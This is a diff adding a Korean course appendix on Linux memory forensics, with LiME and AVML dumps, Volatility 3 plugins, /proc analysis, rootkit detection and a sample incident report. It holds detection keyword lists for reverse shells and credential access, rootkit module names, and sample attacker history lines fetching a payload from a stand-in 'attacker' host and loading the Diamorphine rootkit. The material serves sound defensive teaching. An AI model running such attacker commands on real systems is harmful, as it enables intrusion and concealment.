@@ -1082,3 +1082,489 @@ graph LR
 
 **학생 액션**: 1주 hunt 보고서.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course14 SOC Advanced — Week 08 메모리 포렌식·Volatility·LiME·rootkit)
+
+> 이 부록은 lab `soc-adv-ai/week08.yaml` (10 step + multi_task) 의 모든 명령을
+> 실제로 실행 가능한 형태로 정리한다. Linux 메모리 dump (LiME / AVML), Volatility 3
+> plugin (pslist/pstree/netstat/bash/lsmod/check_*), /proc 직접 분석, rootkit 탐지,
+> syscall table 무결성, 메모리 포렌식 보고서까지.
+
+### lab step → 도구·메모리 매핑 표
+
+| step | 학습 항목 | 핵심 OSS 도구 / 명령 | ATT&CK |
+|------|----------|---------------------|--------|
+| s1 | 메모리 상태 + dump 공간 | `free -h`, `cat /proc/meminfo`, slab info | - |
+| s2 | /proc 프로세스 enum + 비정상 | python /proc 직접 + ps 비교 | T1057 |
+| s3 | 프로세스 트리 (parent-child anomaly) | pstree + ps -ef + osquery | T1059 / T1574 |
+| s4 | 숨겨진 프로세스 탐지 | /proc enum vs ps diff + unhide | T1014 |
+| s5 | 네트워크 연결 (메모리 관점) | /proc/net/tcp 직접 + lsof | T1071 |
+| s6 | 메모리 맵 + strings | /proc/PID/maps + strings + xxd | T1003 |
+| s7 | 커널 모듈 무결성 | lsmod + modinfo + 서명 | T1014 |
+| s8 | bash history + 환경변수 | /proc/PID/environ + .bash_history | T1059.004 |
+| s9 | 시스템 콜 테이블 무결성 | /proc/kallsyms + chkrootkit | T1014 |
+| s10 | 메모리 포렌식 종합 보고서 | markdown + 5 phase + IOC | - |
+| s99 | 통합 다단계 (s1→s2→s3→s4→s5) | Bastion plan: meminfo→/proc→tree→hidden→net | 다중 |
+
+### 학생 환경 준비
+
+```bash
+# === Volatility 3 ===
+pip install --user volatility3
+vol3 --help
+
+# === LiME ===
+sudo apt install -y linux-headers-$(uname -r) build-essential
+git clone https://github.com/504ensicsLabs/LiME /tmp/lime
+cd /tmp/lime/src && make
+
+# === AVML ===
+git clone https://github.com/microsoft/avml /tmp/avml
+sudo install /tmp/avml/avml /usr/local/bin/
+
+# === Rootkit 탐지 ===
+sudo apt install -y unhide rkhunter chkrootkit
+
+# === 기본 도구 ===
+sudo apt install -y procps kmod binutils
+```
+
+### 핵심 도구별 상세 사용법
+
+#### 도구 1: 메모리 상태 + Dump 준비 (Step 1)
+
+```bash
+# 시스템 메모리
+free -h
+cat /proc/meminfo | head -20
+sudo cat /proc/slabinfo | head -10   # 커널 slab cache
+
+# Dump 공간 추정
+TOTAL_KB=$(grep MemTotal /proc/meminfo | awk '{print $2}')
+echo "Memory: $((TOTAL_KB/1024))MB, Dump 필요: $((TOTAL_KB*11/1024/10))MB (10% 여유)"
+
+# /tmp 가 tmpfs 면 dump 위치 분리
+mount | grep tmpfs
+
+# === LiME dump ===
+cd /tmp/lime/src
+sudo insmod lime-$(uname -r).ko "path=/var/log/forensics/mem.lime format=lime"
+ls -lh /var/log/forensics/mem.lime
+
+# === AVML 대안 ===
+sudo /usr/local/bin/avml /var/log/forensics/mem.avml
+
+# === Hash + CoC ===
+sudo sha256sum /var/log/forensics/mem.* > /var/log/forensics/mem-hash.txt
+cat > /var/log/forensics/coc-mem-2026-05-02.txt << 'COC'
+=== CHAIN OF CUSTODY — Memory Dump ===
+Case: IR-2026-Q2-001
+File: mem.lime (8.0 GB)
+SHA256: $(sha256sum /var/log/forensics/mem.lime | cut -d' ' -f1)
+Captured: 2026-05-02 14:00:30 KST (web 호스트)
+Tool: LiME 1.9 + Linux 5.15
+Storage: read-only encrypted volume
+COC
+```
+
+#### 도구 2: /proc 직접 분석 (Step 2·3)
+
+```python
+import os, json
+
+processes = []
+for pid in os.listdir('/proc'):
+    if not pid.isdigit(): continue
+    try:
+        cmdline = open(f'/proc/{pid}/cmdline').read().replace('\x00',' ').strip()
+        comm = open(f'/proc/{pid}/comm').read().strip()
+        exe = os.readlink(f'/proc/{pid}/exe') if os.path.exists(f'/proc/{pid}/exe') else ''
+        status = open(f'/proc/{pid}/status').read()
+        ppid = next((l.split()[1] for l in status.split('\n') if l.startswith('PPid:')), '?')
+        uid = next((l.split()[1] for l in status.split('\n') if l.startswith('Uid:')), '?')
+        processes.append({'pid':int(pid), 'ppid':int(ppid) if ppid!='?' else 0,
+                         'uid':int(uid) if uid!='?' else 0,
+                         'comm':comm, 'cmdline':cmdline[:200], 'exe':exe})
+    except Exception: pass
+
+# 비정상 1: cmdline 비어있음
+hidden = [p for p in processes if not p['cmdline'] and not p['comm'].startswith('[')]
+for p in hidden: print(f"[no-cmdline] PID {p['pid']} comm='{p['comm']}'")
+
+# 비정상 2: 의심 경로
+sus = [p for p in processes if any(d in p['exe'] for d in ('/tmp/','/dev/shm/','/var/tmp/'))]
+for p in sus: print(f"[sus-path] PID {p['pid']} exe={p['exe']}")
+
+# 비정상 3: deleted (fileless)
+deleted = [p for p in processes if '(deleted)' in p['exe']]
+for p in deleted: print(f"[fileless] PID {p['pid']} cmdline={p['cmdline']}")
+
+# 비정상 4: 부모-자식 (web → shell)
+for p in processes:
+    if p['comm'] in ('bash','sh','dash'):
+        parent = next((x for x in processes if x['pid']==p['ppid']), None)
+        if parent and parent['comm'] in ('nginx','apache2','php-fpm','java'):
+            print(f"WARN: shell from web — PID {p['pid']} parent={parent['comm']}")
+
+json.dump(processes, open('/tmp/proc-enum.json','w'), indent=2)
+```
+
+```bash
+# bash 빠른 분석
+ps -eo pid,ppid,comm,args | awk '$2 == 1 && $3 != "systemd" && $3 != "init"'
+ps -eo pid,comm,args | grep -E '(/proc/[0-9]+/(fd|exe)|/dev/shm/)'   # fileless
+
+# 프로세스 트리
+pstree -p | head -30
+pstree -p $(pgrep nginx) | head
+```
+
+#### 도구 3: 숨겨진 프로세스 탐지 (Step 4)
+
+```bash
+# /proc enum vs ps
+diff <(ls /proc | grep -E '^[0-9]+$' | sort -n) \
+     <(ps -eo pid --no-headers | sort -n)
+
+# unhide
+sudo unhide brute       # PID 무차별 검사
+sudo unhide proc        # /proc/<pid> + maps + exists 비교
+sudo unhide-tcp         # 숨겨진 socket
+sudo unhide sys         # syscall scan (가장 신뢰)
+
+# 직접 kill check
+for pid in $(seq 1 65535); do
+    [ -d "/proc/$pid" ] && ! ps -p $pid > /dev/null 2>&1 && \
+      echo "HIDDEN: $pid ($(cat /proc/$pid/comm 2>/dev/null))"
+done | head
+
+# Volatility (메모리 dump)
+vol3 -f /var/log/forensics/mem.lime linux.pslist > /tmp/vol-pslist.txt
+vol3 -f /var/log/forensics/mem.lime linux.psscan > /tmp/vol-psscan.txt
+diff <(awk '{print $2}' /tmp/vol-pslist.txt | sort) <(awk '{print $2}' /tmp/vol-psscan.txt | sort)
+# psscan 만 있는 PID = 숨김 (unlinked task)
+```
+
+#### 도구 4: 네트워크 연결 (메모리) (Step 5)
+
+```bash
+# /proc/net/tcp 직접 파싱
+cat /proc/net/tcp | awk 'NR>1 {
+    split($2,l,":"); split($3,r,":")
+    lip=sprintf("%d.%d.%d.%d", strtonum("0x"substr(l[1],7,2)),strtonum("0x"substr(l[1],5,2)),
+                                strtonum("0x"substr(l[1],3,2)),strtonum("0x"substr(l[1],1,2)))
+    rip=sprintf("%d.%d.%d.%d", strtonum("0x"substr(r[1],7,2)),strtonum("0x"substr(r[1],5,2)),
+                                strtonum("0x"substr(r[1],3,2)),strtonum("0x"substr(r[1],1,2)))
+    printf "%s:%d -> %s:%d  state=%s  inode=%s\n", lip, strtonum("0x"l[2]), rip, strtonum("0x"r[2]), $4, $10
+}' | head
+
+# lsof + ss
+sudo lsof -i -n -P | head -20
+sudo ss -tunap | head
+
+# 의심 outbound (bash/nc/python 외부 IP 통신)
+sudo ss -tunap | awk '
+    /^tcp/ && $4 != "127.0.0.1:" {
+        if ($6 ~ /(bash|sh|nc|ncat|python|perl)/) print "Suspicious:", $0
+    }' | head
+
+# Volatility
+vol3 -f /var/log/forensics/mem.lime linux.netstat
+```
+
+#### 도구 5: 메모리 맵 + Strings (Step 6)
+
+```bash
+PID=5678
+sudo cat /proc/$PID/maps | head -20
+
+# 익명 RWX 매핑 (shellcode injection 의심)
+sudo awk '/rwxp/ && !/\[/' /proc/$PID/maps
+
+# /proc/PID/mem 직접
+sudo dd if=/proc/$PID/mem bs=1 skip=$((0x7f1234000000)) count=$((0x100000)) 2>/dev/null > /tmp/mem-segment.bin
+strings /tmp/mem-segment.bin | head -30
+
+# 의심 키워드
+sudo strings /proc/$PID/mem 2>/dev/null | grep -iE "(password|secret|api_key|/bin/sh -i)" | head
+
+# 전체 프로세스 검사
+for pid in $(ps -eo pid --no-headers); do
+    sudo strings /proc/$pid/mem 2>/dev/null | \
+      grep -qE "(reverse_shell|backdoor|/bin/sh -i)" && \
+      echo "Suspicious memory: PID $pid ($(cat /proc/$pid/comm))"
+done
+
+# Volatility
+vol3 -f /var/log/forensics/mem.lime strings -s /tmp/strings.txt
+grep -iE "password|api_key" /tmp/strings.txt | head
+vol3 -f /var/log/forensics/mem.lime linux.proc.Maps --pid 5678
+```
+
+#### 도구 6: 커널 모듈 무결성 (Step 7)
+
+```bash
+lsmod | head -20
+modinfo nf_log_syslog       # 서명 + 경로 + 버전
+
+# 비정상 경로
+for m in $(lsmod | awk 'NR>1 {print $1}'); do
+    path=$(modinfo $m 2>/dev/null | grep filename | awk '{print $2}')
+    [ -n "$path" ] && [[ "$path" != /lib/modules/* ]] && echo "WARN: $m at $path"
+done
+
+# 알려진 rootkit
+RKMODS="diamorphine reptile suterusu jynx pop3 phalanx adore"
+for m in $RKMODS; do
+    lsmod | grep -q "^$m" && echo "ROOTKIT 의심: $m loaded"
+done
+
+# /proc/modules 직접 (lsmod 우회)
+sudo cat /proc/modules | head
+
+# Volatility
+vol3 -f /var/log/forensics/mem.lime linux.lsmod
+vol3 -f /var/log/forensics/mem.lime linux.check_modules
+
+# Diamorphine 시그니처
+sudo dmesg | grep -i diamorphine
+ls /sys/module/diamorphine 2>/dev/null
+```
+
+#### 도구 7: bash history + 환경변수 (Step 8)
+
+```bash
+# bash_history (디스크)
+sudo grep -rE "(wget|curl|nc -e|base64|chmod \+s|chattr \+i|/etc/shadow)" \
+    /home/*/.bash_history /root/.bash_history 2>/dev/null | head
+
+# /proc/PID/environ
+PID=5678
+sudo cat /proc/$PID/environ | tr '\0' '\n' | head
+# LD_PRELOAD=/tmp/libev.so   ← rootkit 의심
+# AWS_ACCESS_KEY=AKIA...      ← 자격증명 노출
+
+# LD_PRELOAD 모든 프로세스
+for pid in $(ps -eo pid --no-headers); do
+    env=$(sudo cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep ^LD_PRELOAD)
+    [ -n "$env" ] && echo "PID $pid: $env"
+done
+
+# /etc/ld.so.preload (global)
+[ -f /etc/ld.so.preload ] && cat /etc/ld.so.preload
+
+# Volatility — 메모리에서 직접 bash readline 추출
+vol3 -f /var/log/forensics/mem.lime linux.bash
+# PID  PROCESS  COMMAND TIME           COMMAND
+# 5678 bash     2026-05-02 14:02:00    wget http://attacker/payload.sh
+# 5678 bash     2026-05-02 14:02:35    insmod /tmp/diamorphine.ko
+```
+
+#### 도구 8: Syscall 무결성 (Step 9)
+
+```bash
+# /proc/kallsyms — 커널 심볼
+sudo grep -E " T sys_(read|write|open|exec|kill|mount)$" /proc/kallsyms | head
+
+# 텍스트 영역 외부 = rootkit hook
+TEXT_START=$(sudo grep " T _text$" /proc/kallsyms | awk '{print $1}')
+TEXT_END=$(sudo grep " R __init_end$" /proc/kallsyms | awk '{print $1}')
+sudo grep -E " T sys_" /proc/kallsyms | while read addr type name; do
+    if [[ "0x$addr" < "0x$TEXT_START" || "0x$addr" > "0x$TEXT_END" ]]; then
+        echo "SUSPICIOUS: $name at $addr (outside kernel text)"
+    fi
+done
+
+# Volatility
+vol3 -f /var/log/forensics/mem.lime linux.check_syscall
+vol3 -f /var/log/forensics/mem.lime linux.check_idt        # IDT 무결성
+vol3 -f /var/log/forensics/mem.lime linux.check_creds      # 비정상 root
+
+# chkrootkit + rkhunter
+sudo chkrootkit | grep -v "not infected"
+sudo rkhunter --check --skip-keypress 2>&1 | grep -iE "(warning|infected|rootkit)"
+```
+
+#### 도구 9: 메모리 포렌식 종합 보고서 (Step 10)
+
+```bash
+cat > /tmp/memory_forensics_report.txt << 'EOF'
+=== Memory Forensics Report — IR-2026-Q2-001 ===
+
+## 1. Acquisition
+- Tool: LiME 1.9 / Target: web (10.20.30.80) / Time: 2026-05-02 14:00:30
+- File: /var/log/forensics/mem.lime (8.0 GB) / SHA256: 029a5cefb1...
+- CoC: /var/log/forensics/coc-mem-2026-05-02.txt
+
+## 2. System State
+- Memory: 7.7 GiB used 2.3, free 3.1, slab 345 MB
+
+## 3. Process Analysis
+- 총: 187 / 의심 경로: 1 (/tmp/payload deleted) / Fileless: 1
+- Parent-child anomaly: PID 5678 bash, parent nginx (★)
+
+## 4. Hidden Process
+- unhide: HIDDEN PID 12345
+- Volatility psscan: 1 추가 PID — pslist 에 없음 (unlinked task)
+
+## 5. Network (suspicious outbound)
+- 10.20.30.80:34567 → 192.168.1.50:4444 (PID 5678 bash, ESTABLISHED)
+
+## 6. Memory Maps + Strings
+- PID 5678 RWX 익명 매핑: 2 (shellcode 의심)
+- strings: "reverse_shell", "/bin/sh -i", "192.168.1.50:4444"
+
+## 7. Kernel Modules
+- 비정상 경로: diamorphine.ko from /tmp/ (★ ROOTKIT)
+
+## 8. Bash History (메모리)
+- 14:02:00  wget http://attacker/payload.sh
+- 14:02:30  chmod +x payload.sh
+- 14:02:35  insmod /tmp/diamorphine.ko
+- (디스크 /home/ccc/.bash_history 는 변조됨 ★)
+
+## 9. Syscall Integrity
+- /proc/kallsyms 외부 핸들러: 0
+- chkrootkit: Diamorphine rootkit 의심
+- rkhunter: warning Diamorphine
+
+## 10. IOC
+- Memory: PID 5678 (fileless), PID 12345 (hidden), diamorphine.ko
+- Network: 192.168.1.50:4444 (reverse shell)
+- File: /tmp/payload (deleted), /tmp/diamorphine.ko
+
+## 11. Attack Timeline
+- 14:01:23  attacker exploit web (week07 PCAP)
+- 14:02:00  wget payload (메모리 bash history)
+- 14:02:30  chmod + execute
+- 14:02:35  insmod diamorphine.ko
+- 14:02:40  hide PID 5678
+- 14:03:00  reverse shell 192.168.1.50:4444
+
+## 12. Recommendations
+### Short-term (≤24h)
+- 호스트 격리 + 디스크 이미징 + 다른 호스트 검사
+### Mid-term (≤7일)
+- diamorphine 시그니처 → Wazuh / chkrootkit 룰
+- LKM 차단 (modules_disabled = 1)
+- LD_PRELOAD 모니터링 (ld.so.preload + /proc/PID/environ)
+### Long-term (≤90일)
+- LiME 정기 운영 (월 1회)
+- Volatility CI/CD
+- EDR (Velociraptor) 도입
+EOF
+
+pandoc /tmp/memory_forensics_report.txt -o /tmp/memory_forensics_report.pdf \
+  --pdf-engine=xelatex -V mainfont="Noto Sans CJK KR"
+```
+
+### 점검 / 분석 / 보고 흐름 (10 step + multi_task 통합)
+
+#### Phase A — 수집 (s1·s2·s3)
+
+```bash
+cd /tmp/lime/src && sudo make
+sudo insmod lime-$(uname -r).ko "path=/var/log/forensics/mem.lime format=lime"
+sudo sha256sum /var/log/forensics/mem.lime > /var/log/forensics/mem.lime.sha256
+python3 /tmp/proc-enum.py > /tmp/proc-enum.txt
+```
+
+#### Phase B — 분석 (s4·s5·s6·s7·s8·s9)
+
+```bash
+# Volatility 풀 분석
+for plugin in pslist psscan netstat lsmod check_modules bash check_syscall; do
+    vol3 -f /var/log/forensics/mem.lime linux.$plugin > /tmp/vol-${plugin}.txt
+done
+
+# 숨김 검출
+diff <(awk '{print $2}' /tmp/vol-pslist.txt | sort) <(awk '{print $2}' /tmp/vol-psscan.txt | sort)
+
+# rootkit
+sudo unhide brute
+sudo chkrootkit | grep -v "not infected"
+sudo rkhunter --check --skip-keypress 2>&1 | grep -iE "(warning|infected)"
+```
+
+#### Phase C — 보고 + 격리 (s10)
+
+```bash
+vim /tmp/memory_forensics_report.txt
+pandoc /tmp/memory_forensics_report.txt -o /tmp/memory_forensics_report.pdf
+
+# 호스트 격리
+ssh ccc@10.20.30.80 'sudo iptables -P OUTPUT DROP && sudo iptables -P INPUT DROP'
+```
+
+#### Phase D — 통합 시나리오 (s99 multi_task)
+
+s1 → s2 → s3 → s4 → s5 를 Bastion 가 한 번에:
+
+1. **plan**: meminfo → /proc enum → 트리 → 숨김 → 네트워크
+2. **execute**: free + cat /proc + python /proc enum + ps + unhide + cat /proc/net/tcp + lsof
+3. **synthesize**: 5 산출물 (meminfo.txt / proc-enum.json / pstree.txt / hidden.txt / netstat.txt)
+
+### 도구 비교표 — 메모리 포렌식 단계별
+
+| 단계 | 1순위 | 2순위 | 사용 조건 |
+|------|-------|-------|----------|
+| Linux dump | LiME (LKM) | AVML (no LKM) | LiME 정밀 |
+| Windows dump | WinPmem | DumpIt | Windows |
+| Live (no dump) | /proc + ps + unhide | osquery | 빠른 |
+| dump 분석 | Volatility 3 | Volatility 2 (legacy) | v3 |
+| Linux plugin | linux.pslist/psscan/netstat/bash/lsmod | linux.check_* | depth |
+| Rootkit 탐지 | unhide + chkrootkit + rkhunter | OSSEC rootcheck | 다층 |
+| LKM 검증 | check_modules + dkms | lsmod + /proc/modules | 다중 |
+| Strings | strings + grep | volatility strings | 빠른 |
+| Process injection | proc.Maps + RWX | hollowfind (Win) | RWX |
+| LD_PRELOAD | /proc/PID/environ + ld.so.preload | osquery process_envs | 가벼움 |
+| Syscall hook | check_syscall + check_idt | Tracee (eBPF live) | live |
+
+### 도구 선택 매트릭스 — 시나리오별 권장
+
+| 시나리오 | 우선 도구 | 이유 |
+|---------|---------|------|
+| "incident — 즉시" | LiME + Volatility 3 + chkrootkit | 표준 풀스택 |
+| "live response (no dump)" | /proc + unhide + lsof | 빠른 |
+| "fileless 의심" | Volatility proc.Maps + RWX | 메모리만 |
+| "rootkit 의심" | chkrootkit + rkhunter + check_* | 다층 |
+| "LD_PRELOAD" | /proc/PID/environ + ld.so.preload | 가벼움 |
+| "credential dump" | Volatility strings + grep password | 메모리 |
+| "법적 증거" | LiME + sha256 + PGP + CoC | 무결성 |
+| "분산 환경" | Velociraptor (EDR + 메모리) | 자동 |
+
+### 학생 셀프 체크리스트 (각 step 완료 기준)
+
+- [ ] s1: free + meminfo + slab + dump 공간 + LiME/AVML dump
+- [ ] s2: python /proc enum (PID/PPID/UID/comm/cmdline/exe) + 비정상
+- [ ] s3: pstree + parent-child anomaly (web → shell)
+- [ ] s4: /proc vs ps diff + unhide brute + Volatility psscan
+- [ ] s5: /proc/net/tcp + lsof + ss + 비정상 outbound
+- [ ] s6: /proc/PID/maps + RWX 익명 + strings + 의심 키워드
+- [ ] s7: lsmod + modinfo + 비정상 경로 + 알려진 rootkit
+- [ ] s8: /proc/PID/environ LD_PRELOAD + .bash_history + Volatility linux.bash
+- [ ] s9: /proc/kallsyms 외부 + check_syscall + chkrootkit + rkhunter
+- [ ] s10: 12 섹션 보고서 + IOC + timeline + 권고
+- [ ] s99: Bastion 가 5 작업 (meminfo/proc/tree/hidden/net) 순차
+
+### 추가 참조 자료
+
+- **LiME** https://github.com/504ensicsLabs/LiME
+- **AVML** https://github.com/microsoft/avml
+- **Volatility 3 Docs** https://volatility3.readthedocs.io/
+- **Volatility Linux Plugins** https://github.com/volatilityfoundation/volatility3/wiki/Linux-Plugins
+- **The Art of Memory Forensics** Ligh, Case, Levy, Walters (Wiley 2014)
+- **chkrootkit** http://www.chkrootkit.org/
+- **rkhunter** http://rkhunter.sourceforge.net/
+- **unhide** http://www.unhide-forensics.info/
+- **Diamorphine** (분석 대상 — Linux LKM rootkit)
+- **NIST SP 800-86** §3 Volatile Data
+- **Velociraptor** OSS EDR
+- **Microsoft DFIR Notebooks** https://github.com/microsoft/Microsoft-Defender-Hunting-Notebooks
+
+위 모든 메모리 포렌식 작업은 **즉시 캡처 + 격리 분석 host** 로 수행한다. 메모리는 휘발성 —
+전원 차단 시 회복 불가. LiME / AVML 은 root 필수, 분석은 격리 forensic VM. **dump 파일이
+자격증명 / PII 포함** — read-only encrypted volume + access log + 7년 retention.
+법적 절차는 week07 의 양식 참조.
